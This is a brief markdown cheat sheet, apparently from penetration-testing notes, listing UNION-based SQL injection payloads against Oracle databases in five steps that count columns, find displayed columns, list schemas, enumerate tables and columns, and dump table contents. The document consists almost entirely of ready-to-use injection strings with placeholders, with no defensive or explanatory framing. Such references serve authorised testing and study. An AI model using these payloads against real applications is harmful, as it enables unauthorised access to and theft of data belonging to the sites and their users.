# Oracle SQL injection

## UNION Based

### Step 1. Number of columns

```sql
' UNION SELECT NULL FROM DUAL-- -
' UNION SELECT NULL,NULL FROM DUAL-- -
# etc
```

### Step 2. List columns on the web

```sql
' # Example:
' UNION SELECT 'a',NULL,NULL,NULL FROM DUAL-- -
```

### Step 3. Show databases

```sql
# Show databases:
' ## To see the names of all the databases:
' UNION SELECT DISTINCT owner,null FROM all_tables-- -
' ## It shows the current DB:
' UNION SELECT user AS schema_name,NULL FROM dual-- -
```

### Step 4. Tables and columns

```sql
# Tables
' ## View all tables in all databases:
' UNION SELECT table_name,NULL FROM all_tables-- -
' ## View all tables in all databases (best format):
' UNION SELECT owner||':'||table_name,NULL FROM all_tables-- -
' ## Specifying DB:
' UNION SELECT table_name,null FROM all_tables WHERE owner = '<DB NAME>'-- -

' # Columns:
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='<TABLE NAME>'
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='<TABLE NAME>' and owner='<DB NAME>'
```

### Step 5. Dump info

```sql
' UNION SELECT <COLUMN NAME>, <COLUMN NAME>,NULL,NULL,NULL FROM <TABLE NAME>-- -
' UNION SELECT <COLUMN NAME>||':'||<COLUMN NAME>,NULL,NULL,NULL,NULL FROM <TABLE NAME>-- -
```
